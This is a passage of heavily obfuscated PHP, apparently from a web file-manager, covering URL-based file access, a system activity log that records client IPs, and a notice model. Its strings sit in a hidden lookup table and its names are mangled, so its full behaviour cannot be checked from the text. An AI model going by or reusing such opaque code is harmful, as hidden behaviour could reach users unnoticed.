$‹–•»Ìä[1313]); $¢ŒÌÅùé = is_array($±óı¦óÌ[$‹–•»Ìä[1301]]) ? json_encode($±óı¦óÌ[$‹–•»Ìä[1301]]) : $±óı¦óÌ[$‹–•»Ìä[1301]]; show_json($‹–•»Ìä[1314] . $¢ŒÌÅùé, !1); die; } } goto Eå³çËä‰æ; BƒÛ´ÜÖâ´: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($»½·ò = false) { } public function exist($»Üè¶µ®) { $Šì…ÊÈÒ = $this->info($»Üè¶µ®); return $Šì…ÊÈÒ[$_SERVER[ùèÅ´Ãš][235]]; } public function isFile($µ¬ıßÂ’) { $¼Í•ƒ´ = $this->info($µ¬ıßÂ’); return $¼Í•ƒ´[$_SERVER[ùèÅ´Ãš][235]]; } public function isFolder($Ç¾îÀêß) { return !1; } public function size($ĞåÌúÅ¶) { $ÜÔã¾àÉ = $this->info($ĞåÌúÅ¶); return $ÜÔã¾àÉ[$_SERVER[ùèÅ´Ãš][79]]; } public function info($ü“Ÿâí¹) { return $this->infoParse($ü“Ÿâí¹); } public function infoAuth($¨†Ë¿ûÜ) { return $this->infoParse($¨†Ë¿ûÜ); } public function infoWithChildren($«­ù¹˜) { return $this->infoParse($«­ù¹˜); } public function infoFull($›ÌŸÌ) { return $this->infoParse($›ÌŸÌ); } private function infoParse($•ü’ÉÕ) { $ÁûŒˆòŸ =& $_SERVER[ùèÅ´Ãš]; $¢ïš„ö = $this->header($•ü’ÉÕ); if (!$¢ïš„ö || !$¢ïš„ö[$ÁûŒˆòŸ[827]]) { return !1; } $‰íôŸÆ = _get($¢ïš„ö, $ÁûŒˆòŸ[414], 0); $¦îİ·Ñ‹ = array($ÁûŒˆòŸ[32] => $¢ïš„ö[$ÁûŒˆòŸ[32]], $ÁûŒˆòŸ[87] => $•ü’ÉÕ, $ÁûŒˆòŸ[33] => $ÁûŒˆòŸ[233], $ÁûŒˆòŸ[79] => intval($‰íôŸÆ), $ÁûŒˆòŸ[169] => get_path_ext($¢ïš„ö[$ÁûŒˆòŸ[32]]), $ÁûŒˆòŸ[1477] => $‰íôŸÆ > 0 && $¢ïš„ö[$ÁûŒˆòŸ[1628]], $ÁûŒˆòŸ[1478] => !1); return $¦îİ·Ñ‹; } private function header($ö×Å¹¦) { $ßõÀÓÄ© =& $_SERVER[ùèÅ´Ãš]; if (isset(self::$_cacheHeader[$ö×Å¹¦])) { return self::$_cacheHeader[$ö×Å¹¦]; } $†ÂÃİïÛ = isset($GLOBALS[$ßõÀÓÄ©[1629]]) ? $GLOBALS[$ßõÀÓÄ©[1629]] : !1; $GLOBALS[$ßõÀÓÄ©[1629]] = !0; self::$_cacheHeader[$ö×Å¹¦] = url_header($ö×Å¹¦); $GLOBALS[$ßõÀÓÄ©[1629]] = $†ÂÃİïÛ; return self::$_cacheHeader[$ö×Å¹¦]; } public function hashSimple($³ĞŞõÑ£, $ÂÊˆœ²Ÿ = false) { $Š™²®ûš =& $_SERVER[ùèÅ´Ãš]; $ñ¥÷ğÛŠ = $this->info($³ĞŞõÑ£); if (!$ñ¥÷ğÛŠ || !$ñ¥÷ğÛŠ[$Š™²®ûš[235]]) { return !1; } $–˜ÎÅàŸ = $ñ¥÷ğÛŠ[$Š™²®ûš[79]]; $Ä…ºÎôÍ = 200; $ñĞ¹„İñ = 50; if ($–˜ÎÅàŸ <= $Ä…ºÎôÍ * $ñĞ¹„İñ) { return md5($this->fileSubstr($³ĞŞõÑ£, 0, $–˜ÎÅàŸ)) . $–˜ÎÅàŸ; } $Ìçù­È÷ = intval($–˜ÎÅàŸ / $ñĞ¹„İñ); $ÜŸÁ–ÖØ = $Š™²®ûš[12]; $èŸÑ“¤ = timeFloat(); $•‡£¿Æù = 15; for ($Õ¼¯êì¹ = 0; $Õ¼¯êì¹ < $ñĞ¹„İñ; $Õ¼¯êì¹++) { if (timeFloat() - $èŸÑ“¤ > $•‡£¿Æù) { return !1; } $ä´ªêÈ‚ = $this->fileSubstr($³ĞŞõÑ£, $Ìçù­È÷ * $Õ¼¯êì¹, $Ä…ºÎôÍ); if (!$ä´ªêÈ‚) { return !1; } $ÜŸÁ–ÖØ .= $ä´ªêÈ‚; } $ÜŸÁ–ÖØ .= $this->fileSubstr($³ĞŞõÑ£, $–˜ÎÅàŸ - $Ä…ºÎôÍ, $Ä…ºÎôÍ); return md5($ÜŸÁ–ÖØ) . $–˜ÎÅàŸ; } public function getContent($¡Õ§ÖĞ¹) { return $this->fileSubstr($¡Õ§ÖĞ¹); } public function fileSubstr($™ÔÃú÷, $£öİÄã = 0, $ëú’šŒ« = -1) { $ğîË—Ø =& $_SERVER[ùèÅ´Ãš]; $ƒ†ıø–± = $this->info($™ÔÃú÷); if (!$ƒ†ıø–± || !$ƒ†ıø–±[$ğîË—Ø[235]] && $ƒ†ıø–±[$ğîË—Ø[79]] > 1024 * 1024 * 10) { return !1; } if ($ëú’šŒ« === -1) { $ëú’šŒ« = $ƒ†ıø–±[$ğîË—Ø[79]]; } if ($ëú’šŒ« == 0) { return $ğîË—Ø[12]; } $ï”œ¿ŒÔ = array($ğîË—Ø[1630] . $£öİÄã . $ğîË—Ø[865] . ($£öİÄã + $ëú’šŒ« - 1)); $Åµï¯¤ = url_request($™ÔÃú÷, $ğîË—Ø[1517], !1, $ï”œ¿ŒÔ, !1, !1, 30); return $Åµï¯¤[$ğîË—Ø[1301]] ? $Åµï¯¤[$ğîË—Ø[1301]] : $ğîË—Ø[12]; } public function download($ğÖï¸ Ş, $ê”¨ª) { Downloader::start($ğÖï¸ Ş, $ê”¨ª); return $ê”¨ª; } } $_file = $_SERVER[$_SERVER[ùèÅ´Ãš][1626]]; $_size = $_SERVER[ùèÅ´Ãš][1631]; goto Dµ®Â ²ò; EÔä¤ŠªÏÃ: class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\164\145\155\x5f\154\157\x67"; protected $dataAuto = array(array("\143\162\x65\x61\164\x65\124\151\155\145", "\164\151\155\x65", "\x69\156\163\x65\x72\x74", "\146\165\x6e\143\x74\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Ê ñ¢ÇÓ =& $_SERVER[ùèÅ´Ãš]; return array($Ê ñ¢ÇÓ[2372] => LNG($Ê ñ¢ÇÓ[2373]), $Ê ñ¢ÇÓ[2374] => LNG($Ê ñ¢ÇÓ[2375]), $Ê ñ¢ÇÓ[1941] => LNG($Ê ñ¢ÇÓ[2376]), $Ê ñ¢ÇÓ[2377] => LNG($Ê ñ¢ÇÓ[2378]), $Ê ñ¢ÇÓ[2379] => LNG($Ê ñ¢ÇÓ[2380]), $Ê ñ¢ÇÓ[2381] => LNG($Ê ñ¢ÇÓ[2382]), $Ê ñ¢ÇÓ[2383] => LNG($Ê ñ¢ÇÓ[2384]), $Ê ñ¢ÇÓ[1970] => LNG($Ê ñ¢ÇÓ[2384]), $Ê ñ¢ÇÓ[1971] => LNG($Ê ñ¢ÇÓ[2385]), $Ê ñ¢ÇÓ[2386] => LNG($Ê ñ¢ÇÓ[2387]), $Ê ñ¢ÇÓ[2388] => LNG($Ê ñ¢ÇÓ[2389]), $Ê ñ¢ÇÓ[2390] => LNG($Ê ñ¢ÇÓ[2391]), $Ê ñ¢ÇÓ[2392] => LNG($Ê ñ¢ÇÓ[2393]), $Ê ñ¢ÇÓ[1968] => LNG($Ê ñ¢ÇÓ[2394]), $Ê ñ¢ÇÓ[2395] => LNG($Ê ñ¢ÇÓ[2396]), $Ê ñ¢ÇÓ[1975] => LNG($Ê ñ¢ÇÓ[2397]), $Ê ñ¢ÇÓ[2398] => LNG($Ê ñ¢ÇÓ[2399]), $Ê ñ¢ÇÓ[2400] => LNG($Ê ñ¢ÇÓ[2401]), $Ê ñ¢ÇÓ[2402] => LNG($Ê ñ¢ÇÓ[2403]), $Ê ñ¢ÇÓ[2404] => LNG($Ê ñ¢ÇÓ[2405]), $Ê ñ¢ÇÓ[1978] => LNG($Ê ñ¢ÇÓ[2406]), $Ê ñ¢ÇÓ[1979] => LNG($Ê ñ¢ÇÓ[2407]), $Ê ñ¢ÇÓ[2408] => LNG($Ê ñ¢ÇÓ[2409]), $Ê ñ¢ÇÓ[2410] => LNG($Ê ñ¢ÇÓ[2411]), $Ê ñ¢ÇÓ[2412] => LNG($Ê ñ¢ÇÓ[2413]), $Ê ñ¢ÇÓ[1973] => LNG($Ê ñ¢ÇÓ[2414]), $Ê ñ¢ÇÓ[2415] => LNG($Ê ñ¢ÇÓ[2416]), $Ê ñ¢ÇÓ[1972] => LNG($Ê ñ¢ÇÓ[2417]), $Ê ñ¢ÇÓ[2418] => LNG($Ê ñ¢ÇÓ[2418]), $Ê ñ¢ÇÓ[2419] => LNG($Ê ñ¢ÇÓ[2420]), $Ê ñ¢ÇÓ[2421] => LNG($Ê ñ¢ÇÓ[2418]), $Ê ñ¢ÇÓ[2422] => LNG($Ê ñ¢ÇÓ[2423]), $Ê ñ¢ÇÓ[2424] => LNG($Ê ñ¢ÇÓ[2425]), $Ê ñ¢ÇÓ[2426] => LNG($Ê ñ¢ÇÓ[2425]), $Ê ñ¢ÇÓ[2427] => LNG($Ê ñ¢ÇÓ[2428]), $Ê ñ¢ÇÓ[2429] => LNG($Ê ñ¢ÇÓ[2429]), $Ê ñ¢ÇÓ[2430] => LNG($Ê ñ¢ÇÓ[1945]), $Ê ñ¢ÇÓ[2431] => LNG($Ê ñ¢ÇÓ[2432]), $Ê ñ¢ÇÓ[2433] => LNG($Ê ñ¢ÇÓ[2434]), $Ê ñ¢ÇÓ[2435] => LNG($Ê ñ¢ÇÓ[2436]), $Ê ñ¢ÇÓ[2437] => LNG($Ê ñ¢ÇÓ[2438]), $Ê ñ¢ÇÓ[2439] => LNG($Ê ñ¢ÇÓ[2440]), $Ê ñ¢ÇÓ[2441] => LNG($Ê ñ¢ÇÓ[2441]), $Ê ñ¢ÇÓ[2442] => LNG($Ê ñ¢ÇÓ[2443]), $Ê ñ¢ÇÓ[2444] => LNG($Ê ñ¢ÇÓ[2445]), $Ê ñ¢ÇÓ[2446] => LNG($Ê ñ¢ÇÓ[2447]), $Ê ñ¢ÇÓ[2448] => LNG($Ê ñ¢ÇÓ[2449]), $Ê ñ¢ÇÓ[2450] => LNG($Ê ñ¢ÇÓ[2451]), $Ê ñ¢ÇÓ[2452] => LNG($Ê ñ¢ÇÓ[2453]), $Ê ñ¢ÇÓ[213] => LNG($Ê ñ¢ÇÓ[213]), $Ê ñ¢ÇÓ[214] => LNG($Ê ñ¢ÇÓ[2454]), $Ê ñ¢ÇÓ[2455] => LNG($Ê ñ¢ÇÓ[2455])); } private function typeFile() { $ÒÍ’ÍÚ =& $_SERVER[ùèÅ´Ãš]; $Ş¢Ñ‰÷— = array($ÒÍ’ÍÚ[1975] => array($ÒÍ’ÍÚ[1976]), $ÒÍ’ÍÚ[2390] => array($ÒÍ’ÍÚ[2456]), $ÒÍ’ÍÚ[2392] => array($ÒÍ’ÍÚ[2457]), $ÒÍ’ÍÚ[1968] => array($ÒÍ’ÍÚ[1969], $ÒÍ’ÍÚ[2458]), $ÒÍ’ÍÚ[2400] => array(), $ÒÍ’ÍÚ[2402] => array(), $ÒÍ’ÍÚ[2404] => array(), $ÒÍ’ÍÚ[1978] => array($ÒÍ’ÍÚ[1980]), $ÒÍ’ÍÚ[1979] => array($ÒÍ’ÍÚ[1980]), $ÒÍ’ÍÚ[2408] => array($ÒÍ’ÍÚ[2459]), $ÒÍ’ÍÚ[2410] => array($ÒÍ’ÍÚ[2459]), $ÒÍ’ÍÚ[2412] => array($ÒÍ’ÍÚ[2460]), $ÒÍ’ÍÚ[2398] => array($ÒÍ’ÍÚ[2461]), $ÒÍ’ÍÚ[1973] => array($ÒÍ’ÍÚ[2462]), $ÒÍ’ÍÚ[2415] => array($ÒÍ’ÍÚ[2463]), $ÒÍ’ÍÚ[1972] => array($ÒÍ’ÍÚ[1974])); return $Ş¢Ñ‰÷—; } private function typeAll() { $Ş›Ü¡Ó÷ =& $_SERVER[ùèÅ´Ãš]; $Õª„üÚš = $this->typeList; $Ë¤èŞÉ€ = array_filter($this->typeFile()); foreach ($Ë¤èŞÉ€ as $ øëîÛ => $ßÒ«ôÑ) { $Õª„üÚš[$ßÒ«ôÑ[0]] = $Õª„üÚš[$ øëîÛ]; } $Õª„üÚš[$Ş›Ü¡Ó÷[1980]] = LNG($Ş›Ü¡Ó÷[2464]); $Õª„üÚš[$Ş›Ü¡Ó÷[2459]] = LNG($Ş›Ü¡Ó÷[2465]); return $Õª„üÚš; } public function addLog($ÉÚÈ’Ææ, $Òè‰“î = array()) { $ô¢Áî´’ =& $_SERVER[ùèÅ´Ãš]; if (!isset($this->typeList[$ÉÚÈ’Ææ])) { return; } $¸Øš§µ = Session::get($ô¢Áî´’[2138]); if (!$¸Øš§µ) { $¸Øš§µ = _get($Òè‰“î, $ô¢Áî´’[1797], 0); } if ($ÉÚÈ’Ææ == $ô¢Áî´’[2431] && is_array($Òè‰“î[$ô¢Áî´’[2466]]) && !$Òè‰“î[$ô¢Áî´’[2466]]) { return; } $„÷ßçşà = get_client_ip(); if (!$Òè‰“î || strlen(json_encode($Òè‰“î)) >= 1024 * 64) { if ($Òè‰“î && is_array($Òè‰“î)) { $Òè‰“î = array_intersect_key($Òè‰“î, array_flip($ô¢Áî´’[477], $ô¢Áî´’[32])); $Òè‰“î[$ô¢Áî´’[2467]] = $„÷ßçşà; } else { $Òè‰“î = array($ô¢Áî´’[2467] => $„÷ßçşà); } } else { if (is_array($Òè‰“î)) { $Òè‰“î[$ô¢Áî´’[2467]] = $„÷ßçşà; } else { $Òè‰“î = array($ô¢Áî´’[1301] => $Òè‰“î, $ô¢Áî´’[2467] => $„÷ßçşà); } } $Òè‰“î[$ô¢Áî´’[2468]] = ACTION; $Òè‰“î = array($ô¢Áî´’[1787] => Session::sign(), $ô¢Áî´’[1788] => intval($¸Øš§µ), $ô¢Áî´’[33] => $ÉÚÈ’Ææ, $ô¢Áî´’[1790] => json_encode($Òè‰“î)); return parent::add($Òè‰“î); } public function remove($·”£Ò–š) { $this->where(array($_SERVER[ùèÅ´Ãš][495] => $·”£Ò–š))->delete(); } private function _makeOrder($ù¤è«İ§ = '') { $Ïôõ›ÜÊ =& $_SERVER[ùèÅ´Ãš]; $šïûâÃ¶ = $Ïôõ›ÜÊ[234]; $»˜˜ıïÂ = array($Ïôõ›ÜÊ[525] => $Ïôõ›ÜÊ[526], $Ïôõ›ÜÊ[527] => $Ïôõ›ÜÊ[528]); $ÀµË¶š = Input::get($Ïôõ›ÜÊ[533], $Ïôõ›ÜÊ[7], $Ïôõ›ÜÊ[2181], array($Ïôõ›ÜÊ[2093], $Ïôõ›ÜÊ[527])); $ÀµË¶š = $»˜˜ıïÂ[$ÀµË¶š]; $ù¤è«İ§ = $ù¤è«İ§ . "{$šïûâÃ¶}\40{$ÀµË¶š}"; return $this->order($ù¤è«İ§); } public function get($ ‚ó¡è¿ = '') { $»ÓŠû„ñ =& $_SERVER[ùèÅ´Ãš]; if (!$ ‚ó¡è¿) { show_json(array()); } $Á÷Ã½Äà = array(); if ($ ‚ó¡è¿[$»ÓŠû„ñ[1797]]) { $Á÷Ã½Äà[$»ÓŠû„ñ[1797]] = $ ‚ó¡è¿[$»ÓŠû„ñ[1797]]; } if (isset($ ‚ó¡è¿[$»ÓŠû„ñ[838]])) { $å˜æ¼İŠ = $ ‚ó¡è¿[$»ÓŠû„ñ[838]]; $«¶¬”÷Ğ = isset($ ‚ó¡è¿[$»ÓŠû„ñ[839]]) ? $ ‚ó¡è¿[$»ÓŠû„ñ[839]] : time(); $Á÷Ã½Äà[$»ÓŠû„ñ[234]] = array($»ÓŠû„ñ[410], array($å˜æ¼İŠ, $«¶¬”÷Ğ)); } if ($ ‚ó¡è¿[$»ÓŠû„ñ[33]]) { $Ö…ˆ‡˜ = explode($»ÓŠû„ñ[50], $ ‚ó¡è¿[$»ÓŠû„ñ[33]]); $ü‰°¨ôÒ = $this->typeFile(); $á¢û = array(); foreach ($Ö…ˆ‡˜ as $ÌüöÏ²é) { $á¢û[] = $ÌüöÏ²é; if (isset($ü‰°¨ôÒ[$ÌüöÏ²é])) { $á¢û = array_merge($á¢û, $ü‰°¨ôÒ[$ÌüöÏ²é]); } } $á¢û = array_unique($á¢û); if ($á¢û) { $Á÷Ã½Äà[$»ÓŠû„ñ[33]] = array($»ÓŠû„ñ[7], $á¢û); } } else { $Á÷Ã½Äà[$»ÓŠû„ñ[33]] = array($»ÓŠû„ñ[2469], $»ÓŠû„ñ[2470]); } if (!empty($ ‚ó¡è¿[$»ÓŠû„ñ[2467]])) { $Á÷Ã½Äà[$»ÓŠû„ñ[528]] = array($»ÓŠû„ñ[461], "\x25{$ ‚ó¡è¿[$»ÓŠû„ñ[2467]]}\45"); } $ÄÏŠïŒ¤ = $this->_makeOrder()->where($Á÷Ã½Äà)->selectPage(); if (empty($ÄÏŠïŒ¤[$»ÓŠû„ñ[447]])) { show_json(array(), !0, $ÄÏŠïŒ¤[$»ÓŠû„ñ[444]]); } $ÄÏŠïŒ¤[$»ÓŠû„ñ[447]] = $this->logList($ÄÏŠïŒ¤[$»ÓŠû„ñ[447]]); return $ÄÏŠïŒ¤; } private function ipAddress(&$Æ²ƒÚæÒ) { $€¿‹ßÜù =& $_SERVER[ùèÅ´Ãš]; if (!empty($Æ²ƒÚæÒ[$€¿‹ßÜù[2467]])) { $ºì‘™òé = IpLocation::get($Æ²ƒÚæÒ[$€¿‹ßÜù[2467]]); } else { $ºì‘™òé = LNG($€¿‹ßÜù[2471]); } $Æ²ƒÚæÒ[$€¿‹ßÜù[2472]] = $ºì‘™òé; } private function descZipDownload($úË´Ü‘², &$Êê…ı£è) { $ÂİñÜ¬Æ =& $_SERVER[ùèÅ´Ãš]; if (!isset($úË´Ü‘²[$ÂİñÜ¬Æ[2473]])) { return; } $Çı¼Ÿ´£ = json_decode($úË´Ü‘²[$ÂİñÜ¬Æ[2473]], !0); foreach ($Çı¼Ÿ´£ as $ı¹˜š½») { try { $¨şº§ö• = IO::infoFullSimple($ı¹˜š½»[$ÂİñÜ¬Æ[87]]); } catch (Exception $°‚±ã½Û) { continue; } $úË´Ü‘²[$ÂİñÜ¬Æ[87]] = $ı¹˜š½»[$ÂİñÜ¬Æ[87]]; $Êê…ı£è[] = $úË´Ü‘²[$ÂİñÜ¬Æ[194]] = $¨şº§ö•[$ÂİñÜ¬Æ[194]]; $Êê…ı£è[] = $úË´Ü‘²[$ÂİñÜ¬Æ[2235]] = $¨şº§ö•[$ÂİñÜ¬Æ[193]]; break; } return $úË´Ü‘²; } private function getSourceList(&$ö®óÅÂõ) { $ö·¡•…á =& $_SERVER[ùèÅ´Ãš]; $Ÿêñ…Ì = array(); foreach ($ö®óÅÂõ as $Öç³‰à => $±¬‚œ·è) { $êŒ·´É€ = json_decode($±¬‚œ·è[$ö·¡•…á[528]], !0); if ($±¬‚œ·è[$ö·¡•…á[33]] == $ö·¡•…á[1971]) { $êŒ·´É€ = $this->descZipDownload($êŒ·´É€, $Ÿêñ…Ì); $ö®óÅÂõ[$Öç³‰à][$ö·¡•…á[528]] = json_encode($êŒ·´É€); continue; } if (strpos($±¬‚œ·è[$ö·¡•…á[33]], $ö·¡•…á[2237]) !== 0) { if (!isset($êŒ·´É€[$ö·¡•…á[87]]) || strpos($±¬‚œ·è[$ö·¡•…á[33]], $ö·¡•…á[2474]) !== 0) { continue; } try { $ß—ØÔÆƒ = IO::infoFullSimple($êŒ·´É€[$ö·¡•…á[87]]); } catch (Exception $Òıé»í¤) { continue; } $Ÿêñ…Ì[] = $êŒ·´É€[$ö·¡•…á[194]] = $ß—ØÔÆƒ[$ö·¡•…á[194]]; $Ÿêñ…Ì[] = $êŒ·´É€[$ö·¡•…á[2235]] = $ß—ØÔÆƒ[$ö·¡•…á[193]]; $ö®óÅÂõ[$Öç³‰à][$ö·¡•…á[528]] = json_encode($êŒ·´É€); continue; } $Ÿêñ…Ì[] = $êŒ·´É€[$ö·¡•…á[194]]; $Ÿêñ…Ì[] = $êŒ·´É€[$ö·¡•…á[2235]]; if ($êŒ·´É€[$ö·¡•…á[33]] == $ö·¡•…á[627]) { $Ÿêñ…Ì[] = $êŒ·´É€[$ö·¡•…á[528]][$ö·¡•…á[1253]]; $Ÿêñ…Ì[] = $êŒ·´É€[$ö·¡•…á[528]][$ö·¡•…á[1254]]; } if ($êŒ·´É€[$ö·¡•…á[33]] == $ö·¡•…á[2246]) { $Ÿêñ…Ì[] = $êŒ·´É€[$ö·¡•…á[528]][$ö·¡•…á[194]]; } } if (!$Ÿêñ…Ì) { return array(); } return Model($ö·¡•…á[908])->sourceListInfo($Ÿêñ…Ì, !0); } private function logList($¨Ë¯šìŞ) { $ŸøÜÇóÒ =& $_SERVER[ùèÅ´Ãš]; $£ñÀí® = array_to_keyvalue($¨Ë¯šìŞ, $ŸøÜÇóÒ[12], $ŸøÜÇóÒ[1797]); $Ì˜óƒÓÅ = Model($ŸøÜÇóÒ[601])->userListInfo(array_unique($£ñÀí®)); $¸À‡µ¨¶ = $this->getSourceList($¨Ë¯šìŞ); $ğÃÉÙñ = $this->typeAll(); $™àˆÍ£º = array(); $¥ÑÄ¶Ì = array(); foreach ($¨Ë¯šìŞ as $ÏÚßûà¼ => $¾Æè³À) { $ó”Å¾­ = $¾Æè³À[$ŸøÜÇóÒ[33]]; $™œŞ±ğ = isset($Ì˜óƒÓÅ[$¾Æè³À[$ŸøÜÇóÒ[1797]]]) ? $Ì˜óƒÓÅ[$¾Æè³À[$ŸøÜÇóÒ[1797]]] : !1; $À£òì»û = strpos($ó”Å¾­, $ŸøÜÇóÒ[2475]) === 0 ? LNG($ŸøÜÇóÒ[2476]) : LNG($ŸøÜÇóÒ[2471]); $¾Æè³À[$ŸøÜÇóÒ[32]] = isset($™œŞ±ğ[$ŸøÜÇóÒ[32]]) ? $™œŞ±ğ[$ŸøÜÇóÒ[32]] : LNG($ŸøÜÇóÒ[2471]); $¾Æè³À[$ŸøÜÇóÒ[2297]] = isset($™œŞ±ğ[$ŸøÜÇóÒ[2297]]) ? $™œŞ±ğ[$ŸøÜÇóÒ[2297]] : $ŸøÜÇóÒ[12]; $¾Æè³À[$ŸøÜÇóÒ[1683]] = isset($ğÃÉÙñ[$ó”Å¾­]) ? $ğÃÉÙñ[$ó”Å¾­] : $À£òì»û; $¾Æè³À[$ŸøÜÇóÒ[2180]] = $™œŞ±ğ; $âªüö¼ = json_decode($¾Æè³À[$ŸøÜÇóÒ[528]], !0); $¾Æè³À[$ŸøÜÇóÒ[2467]] = isset($âªüö¼[$ŸøÜÇóÒ[2467]]) ? $âªüö¼[$ŸøÜÇóÒ[2467]] : $ŸøÜÇóÒ[12]; $¾Æè³À[$ŸøÜÇóÒ[2472]] = IpLocation::get($¾Æè³À[$ŸøÜÇóÒ[2467]]); if (strpos($ó”Å¾­, $ŸøÜÇóÒ[2237]) === 0 || isset($âªüö¼[$ŸøÜÇóÒ[2235]])) { $âªüö¼[$ŸøÜÇóÒ[90]] = $¸À‡µ¨¶[$âªüö¼[$ŸøÜÇóÒ[194]]]; $âªüö¼[$ŸøÜÇóÒ[2251]] = $¸À‡µ¨¶[$âªüö¼[$ŸøÜÇóÒ[2235]]]; if ($âªüö¼[$ŸøÜÇóÒ[33]] == $ŸøÜÇóÒ[627]) { $âªüö¼[$ŸøÜÇóÒ[528]][$ŸøÜÇóÒ[1253]] = $¸À‡µ¨¶[$âªüö¼[$ŸøÜÇóÒ[528]][$ŸøÜÇóÒ[1253]]]; $âªüö¼[$ŸøÜÇóÒ[528]][$ŸøÜÇóÒ[1254]] = $¸À‡µ¨¶[$âªüö¼[$ŸøÜÇóÒ[528]][$ŸøÜÇóÒ[1254]]]; } if ($âªüö¼[$ŸøÜÇóÒ[33]] == $ŸøÜÇóÒ[2246]) { $âªüö¼[$ŸøÜÇóÒ[528]][$ŸøÜÇóÒ[194]] = $¸À‡µ¨¶[$âªüö¼[$ŸøÜÇóÒ[528]][$ŸøÜÇóÒ[194]]]; } if ($âªüö¼[$ŸøÜÇóÒ[33]] == $ŸøÜÇóÒ[1241]) { $âªüö¼[$ŸøÜÇóÒ[2251]] = $âªüö¼[$ŸøÜÇóÒ[90]]; $âªüö¼[$ŸøÜÇóÒ[2235]] = $âªüö¼[$ŸøÜÇóÒ[2251]][$ŸøÜÇóÒ[194]]; $âªüö¼[$ŸøÜÇóÒ[90]] = !1; $âªüö¼[$ŸøÜÇóÒ[194]] = $ŸøÜÇóÒ[12]; } $ìÏÄš¹± = array($ŸøÜÇóÒ[1241], $ŸøÜÇóÒ[2233]); if (!in_array($âªüö¼[$ŸøÜÇóÒ[33]], $ìÏÄš¹±)) { if ($âªüö¼[$ŸøÜÇóÒ[90]] && $âªüö¼[$ŸøÜÇóÒ[90]][$ŸøÜÇóÒ[191]] == $ŸøÜÇóÒ[192]) { $¥ÑÄ¶Ì[] = $¾Æè³À[$ŸøÜÇóÒ[477]]; unset($¨Ë¯šìŞ[$ÏÚßûà¼]); continue; } if ($âªüö¼[$ŸøÜÇóÒ[2251]] && $âªüö¼[$ŸøÜÇóÒ[2251]][$ŸøÜÇóÒ[191]] == $ŸøÜÇóÒ[192]) { $¥ÑÄ¶Ì[] = $¾Æè³À[$ŸøÜÇóÒ[477]]; unset($¨Ë¯šìŞ[$ÏÚßûà¼]); continue; } } } $¾Æè³À[$ŸøÜÇóÒ[528]] = $âªüö¼; unset($¾Æè³À[$ŸøÜÇóÒ[2477]]); $™àˆÍ£º[] = $¾Æè³À; } $this->clearSystemPathLog($¥ÑÄ¶Ì); return $™àˆÍ£º; } private function clearSystemPathLog($”‘‚–’Õ) { $Øáü—· =& $_SERVER[ùèÅ´Ãš]; if (count($”‘‚–’Õ) == 0) { return; } $ú±Ê´Ú¾ = array($Øáü—·[477] => array($Øáü—·[7], array_unique($”‘‚–’Õ))); $this->where($ú±Ê´Ú¾)->delete(); } public function deviceList($ıóÀÅƒÑ, $è˜ÍÏì = 0) { $¡¢»Ï¬ß =& $_SERVER[ùèÅ´Ãš]; $ÔÌıîøá = array($¡¢»Ï¬ß[1797] => $ıóÀÅƒÑ, $¡¢»Ï¬ß[234] => array($¡¢»Ï¬ß[1102], $è˜ÍÏì), $¡¢»Ï¬ß[33] => $¡¢»Ï¬ß[1941]); $ïÄÆ‡ıñ = array(); $­óï¹’Ü = $this->field($¡¢»Ï¬ß[2478])->where($ÔÌıîøá)->order($¡¢»Ï¬ß[2249])->limit(50)->select(); foreach ($­óï¹’Ü as $Ú Ö¶áÍ => $ü˜Í¯‹) { if ($Ú Ö¶áÍ > 0 && abs($ü˜Í¯‹[$¡¢»Ï¬ß[234]] - $­óï¹’Ü[$Ú Ö¶áÍ - 1][$¡¢»Ï¬ß[234]]) < 5) { continue; } $ìÈ÷äØ² = json_decode($ü˜Í¯‹[$¡¢»Ï¬ß[528]], !0); $ü˜Í¯‹[$¡¢»Ï¬ß[2467]] = isset($ìÈ÷äØ²[$¡¢»Ï¬ß[2467]]) ? $ìÈ÷äØ²[$¡¢»Ï¬ß[2467]] : $¡¢»Ï¬ß[12]; unset($ìÈ÷äØ²[$¡¢»Ï¬ß[2467]]); $ß®ŞÔÛ = $this->deviceType($ìÈ÷äØ²[$¡¢»Ï¬ß[2238]]); if (isset($ïÄÆ‡ıñ[$ß®ŞÔÛ])) { continue; } $ü˜Í¯‹[$¡¢»Ï¬ß[2472]] = IpLocation::get($ü˜Í¯‹[$¡¢»Ï¬ß[2467]]); $ü˜Í¯‹[$¡¢»Ï¬ß[528]] = $ìÈ÷äØ²; $ïÄÆ‡ıñ[$ß®ŞÔÛ] = $ü˜Í¯‹; } return array_values($ïÄÆ‡ıñ); } public function deviceType($¦Î”Àˆã) { return $¦Î”Àˆã; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\56\x6e\157\x74\151\x63\x65\114\151\x73\164"; public $field = array("\x6e\x61\155\145", "\143\x6f\156\x74\145\x6e\x74", "\141\165\164\x68", "\155\157\144\x65", "\164\151\155\145", "\x74\171\160\145", "\154\145\x76\x65\x6c", "\145\x6e\x61\x62\x6c\145", "\x73\x6f\x72\x74"); public function listData($öåÙ˜«Í = false, $ÙîØÓÛò = "\x73\157\x72\164", $û×©’Ãİ = false) { return parent::listData($öåÙ˜«Í, $ÙîØÓÛò, $û×©’Ãİ); } public function add($¾ÆÆšòÍ) { $Ÿà´àÂ =& $_SERVER[ùèÅ´Ãš]; $şçÇº· = time(); if ($¾ÆÆšòÍ[$Ÿà´àÂ[16]] == $Ÿà´àÂ[2479]) { $şçÇº· = strtotime($¾ÆÆšòÍ[$Ÿà´àÂ[207]]); } $¾ÆÆšòÍ[$Ÿà´àÂ[207]] = $şçÇº·; return parent::insert($¾ÆÆšòÍ); } public function update($‹Ö¡ƒ‡Ú, $úšÔ¯) { $¨æüÏÚ =& $_SERVER[ùèÅ´Ãš]; $ÏÆëõ­‚ = $this->listData($‹Ö¡ƒ‡Ú); if (!$ÏÆëõ­‚) { return !1; } $öò•×ş = time(); if ($úšÔ¯[$¨æüÏÚ[16]] == $¨æüÏÚ[2479]) { $öò•×ş = strtotime($úšÔ¯[$¨æüÏÚ[207]]); } $úšÔ¯[$¨æüÏÚ[207]] = $öò•×ş; return parent::update($‹Ö¡ƒ‡Ú, $úšÔ¯); } public function remove($áÌúùÜ¨) { $öË ø = $this->listData($áÌúùÜ¨); if (!$öË ø || $öË ø[$_SERVER[ùèÅ´Ãš][192]]) { return !1; } return parent::remove($áÌúùÜ¨); } public function sort($Á«·–Êğ, 